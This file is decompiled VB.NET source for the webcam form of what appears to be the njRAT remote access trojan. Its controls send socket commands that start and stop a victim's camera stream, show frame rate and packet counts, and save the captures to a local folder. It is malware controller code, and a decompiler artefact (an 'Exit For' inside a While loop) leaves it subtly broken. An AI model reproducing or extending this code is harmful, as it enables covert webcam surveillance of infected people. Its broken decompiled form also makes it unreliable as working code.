Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200000B RID: 11
	<DesignerGenerated()>
	Public Partial Class Cam
		Inherits Form

		' Token: 0x06000151 RID: 337 RVA: 0x0000DBC4 File Offset: 0x0000BDC4
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Cam.__ENCList
			SyncLock _ENCList
				If Cam.__ENCList.Count = Cam.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Cam.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Cam.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Cam.__ENCList(num) = Cam.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Cam.__ENCList.RemoveRange(num, Cam.__ENCList.Count - num)
					Cam.__ENCList.Capacity = Cam.__ENCList.Count
				End If
				Cam.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000084 RID: 132
		' (get) Token: 0x06000154 RID: 340 RVA: 0x0000E858 File Offset: 0x0000CA58
		' (set) Token: 0x06000155 RID: 341 RVA: 0x000024BD File Offset: 0x000006BD
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x17000085 RID: 133
		' (get) Token: 0x06000156 RID: 342 RVA: 0x0000E870 File Offset: 0x0000CA70
		' (set) Token: 0x06000157 RID: 343 RVA: 0x0000E888 File Offset: 0x0000CA88
		Friend Overridable Property vmethod_6 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				If Me._vmethod_6 IsNot Nothing Then
					RemoveHandler Me._vmethod_6.Tick, value2
				End If
				Me._vmethod_6 = value
				If Me._vmethod_6 IsNot Nothing Then
					AddHandler Me._vmethod_6.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000086 RID: 134
		' (get) Token: 0x06000158 RID: 344 RVA: 0x0000E8E0 File Offset: 0x0000CAE0
		' (set) Token: 0x06000159 RID: 345 RVA: 0x0000E8F8 File Offset: 0x0000CAF8
		Friend Overridable Property Timer1 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick_1
				If Me._Timer1 IsNot Nothing Then
					RemoveHandler Me._Timer1.Tick, value2
				End If
				Me._Timer1 = value
				If Me._Timer1 IsNot Nothing Then
					AddHandler Me._Timer1.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000087 RID: 135
		' (get) Token: 0x0600015A RID: 346 RVA: 0x0000E950 File Offset: 0x0000CB50
		' (set) Token: 0x0600015B RID: 347 RVA: 0x000024C6 File Offset: 0x000006C6
		Friend Overridable Property ComboBox2 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox2 = value
			End Set
		End Property

		' Token: 0x17000088 RID: 136
		' (get) Token: 0x0600015C RID: 348 RVA: 0x0000E968 File Offset: 0x0000CB68
		' (set) Token: 0x0600015D RID: 349 RVA: 0x000024CF File Offset: 0x000006CF
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox1 = value
			End Set
		End Property

		' Token: 0x17000089 RID: 137
		' (get) Token: 0x0600015E RID: 350 RVA: 0x0000E980 File Offset: 0x0000CB80
		' (set) Token: 0x0600015F RID: 351 RVA: 0x000024D8 File Offset: 0x000006D8
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x1700008A RID: 138
		' (get) Token: 0x06000160 RID: 352 RVA: 0x0000E998 File Offset: 0x0000CB98
		' (set) Token: 0x06000161 RID: 353 RVA: 0x000024E1 File Offset: 0x000006E1
		Friend Overridable Property CheckBox3 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox3 = value
			End Set
		End Property

		' Token: 0x1700008B RID: 139
		' (get) Token: 0x06000162 RID: 354 RVA: 0x0000E9B0 File Offset: 0x0000CBB0
		' (set) Token: 0x06000163 RID: 355 RVA: 0x0000E9C8 File Offset: 0x0000CBC8
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click_1
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700008C RID: 140
		' (get) Token: 0x06000164 RID: 356 RVA: 0x0000EA20 File Offset: 0x0000CC20
		' (set) Token: 0x06000165 RID: 357 RVA: 0x000024EA File Offset: 0x000006EA
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x1700008D RID: 141
		' (get) Token: 0x06000166 RID: 358 RVA: 0x0000EA38 File Offset: 0x0000CC38
		' (set) Token: 0x06000167 RID: 359 RVA: 0x000024F3 File Offset: 0x000006F3
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x1700008E RID: 142
		' (get) Token: 0x06000168 RID: 360 RVA: 0x0000EA50 File Offset: 0x0000CC50
		' (set) Token: 0x06000169 RID: 361 RVA: 0x000024FC File Offset: 0x000006FC
		Friend Overridable Property UserImage1 As UserImage
			<DebuggerNonUserCode()>
			Get
				Return Me._UserImage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UserImage)
				Me._UserImage1 = value
			End Set
		End Property

		' Token: 0x1700008F RID: 143
		' (get) Token: 0x0600016A RID: 362 RVA: 0x0000EA68 File Offset: 0x0000CC68
		' (set) Token: 0x0600016B RID: 363 RVA: 0x0000EA80 File Offset: 0x0000CC80
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000090 RID: 144
		' (get) Token: 0x0600016C RID: 364 RVA: 0x0000EAD8 File Offset: 0x0000CCD8
		' (set) Token: 0x0600016D RID: 365 RVA: 0x00002505 File Offset: 0x00000705
		Friend Overridable Property PictureBox2 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox2 = value
			End Set
		End Property

		' Token: 0x0600016E RID: 366 RVA: 0x0000EAF0 File Offset: 0x0000CCF0
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Cam_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Cam_Load
			Cam.__ENCAddToList(Me)
			Me.fps = 0
			Me.int_0 = 0
			Me.QQ = String.Empty
			Me.folder = String.Empty
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600016F RID: 367 RVA: 0x0000EB5C File Offset: 0x0000CD5C
		Private Sub Cam_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				If Me.sk.CN Then
					Me.sk.Send("@")
				End If
				Me.sk.CN = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000170 RID: 368 RVA: 0x0000EBB4 File Offset: 0x0000CDB4
		Private Sub Cam_Load(sender As Object, e As EventArgs)
			Try
				Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
				Me.Text = Me.QQ
				Me.ComboBox2.SelectedIndex = 3
				Me.vmethod_6.Enabled = True
				Me.folder = Me.osk.Folder + "Cam\"
				If Not Directory.Exists(Me.folder) Then
					Directory.CreateDirectory(Me.folder)
				End If
				Try
					Me.ComboBox2.SelectedIndex = Class7.class8_0.int_0
				Catch ex As Exception
					Me.ComboBox2.SelectedIndex = 3
				End Try
				If Class7.class8_0.bool_7 Then
					Me.Button1.Text = "Stop"
					Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text }))
				End If
			Catch ex2 As Exception
				Me.Close()
			End Try
		End Sub

		' Token: 0x06000171 RID: 369 RVA: 0x0000ED34 File Offset: 0x0000CF34
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Me.vmethod_6.Enabled = False
			Try
				If Me.osk Is Nothing Or Me.sk Is Nothing Then
					Me.Close()
					Return
				End If
				If Not Me.osk.CN Or Not Me.sk.CN Then
					Me.Close()
				End If
			Catch ex As Exception
			End Try
			Me.int_0 = Me.fps
			If Me.int_0 = 0 Then
				Me.pkt = 0
				Me.PictureBox1.Invalidate()
			End If
			Me.fps = 0
			Me.vmethod_6.Enabled = True
		End Sub

		' Token: 0x06000172 RID: 370 RVA: 0x0000EDEC File Offset: 0x0000CFEC
		Private Sub PictureBox1_Paint(sender As Object, e As PaintEventArgs)
			Try
				Dim text As String = Conversions.ToString(Me.int_0) + "fps" & vbCrLf + Class6.smethod_17(CLng(Me.pkt))
				Dim size As Size = TextRenderer.MeasureText(text, New Font(Me.Font, FontStyle.Bold))
				Dim rect As Rectangle = New Rectangle(0, 0, size.Width, size.Height)
				e.Graphics.FillRectangle(Brushes.Black, rect)
				Dim brush As Brush = Brushes.Red
				If Me.int_0 > 3 Then
					brush = Brushes.YellowGreen
				End If
				If Me.int_0 > 6 Then
					brush = Brushes.LimeGreen
				End If
				e.Graphics.DrawString(text, New Font(Me.Font, FontStyle.Bold), brush, 0F, 0F)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000173 RID: 371 RVA: 0x0000EEC4 File Offset: 0x0000D0C4
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Try
				If Operators.CompareString(Me.Button1.Text, "Start", False) = 0 Then
					Me.Button1.Text = "Stop"
					Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text }))
				Else
					Me.Button1.Text = "Start"
					Me.sk.Send("@")
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000174 RID: 372 RVA: 0x0000EF94 File Offset: 0x0000D194
		Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CheckBox3.Checked Then
				Try
					Process.Start(Me.folder)
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000175 RID: 373 RVA: 0x0000EFDC File Offset: 0x0000D1DC
		Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Button1.Text, "Stop", False) = 0 Then
				NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() { RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(Me.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(Me.ComboBox2.SelectedItem))) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x06000176 RID: 374 RVA: 0x0000EFDC File Offset: 0x0000D1DC
		Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Button1.Text, "Stop", False) = 0 Then
				NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() { RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(Me.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(Me.ComboBox2.SelectedItem))) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x06000177 RID: 375 RVA: 0x0000250E File Offset: 0x0000070E
		Private Sub Timer1_Tick_1(sender As Object, e As EventArgs)
			Me.ProgressBar1.Value = Me.sk.rp()
		End Sub

		' Token: 0x06000178 RID: 376 RVA: 0x0000EEC4 File Offset: 0x0000D0C4
		Private Sub Button1_Click_1(sender As Object, e As EventArgs)
			Try
				If Operators.CompareString(Me.Button1.Text, "Start", False) = 0 Then
					Me.Button1.Text = "Stop"
					Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text }))
				Else
					Me.Button1.Text = "Start"
					Me.sk.Send("@")
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000179 RID: 377 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x0400008F RID: 143
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000091 RID: 145
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x04000092 RID: 146
		<AccessedThroughProperty("vmethod_6")>
		Private _vmethod_6 As Timer

		' Token: 0x04000093 RID: 147
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As Timer

		' Token: 0x04000094 RID: 148
		<AccessedThroughProperty("ComboBox2")>
		Private _ComboBox2 As ComboBox

		' Token: 0x04000095 RID: 149
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x04000096 RID: 150
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x04000097 RID: 151
		<AccessedThroughProperty("CheckBox3")>
		Private _CheckBox3 As CheckBox

		' Token: 0x04000098 RID: 152
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000099 RID: 153
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x0400009A RID: 154
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x0400009B RID: 155
		<AccessedThroughProperty("UserImage1")>
		Private _UserImage1 As UserImage

		' Token: 0x0400009C RID: 156
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x0400009D RID: 157
		<AccessedThroughProperty("PictureBox2")>
		Private _PictureBox2 As PictureBox

		' Token: 0x0400009E RID: 158
		Public folder As String

		' Token: 0x0400009F RID: 159
		Public fps As Integer

		' Token: 0x040000A0 RID: 160
		Private int_0 As Integer

		' Token: 0x040000A1 RID: 161
		Public osk As Client

		' Token: 0x040000A2 RID: 162
		Public pkt As Integer

		' Token: 0x040000A3 RID: 163
		Public QQ As String

		' Token: 0x040000A4 RID: 164
		Public sk As Client
	End Class
End Namespace
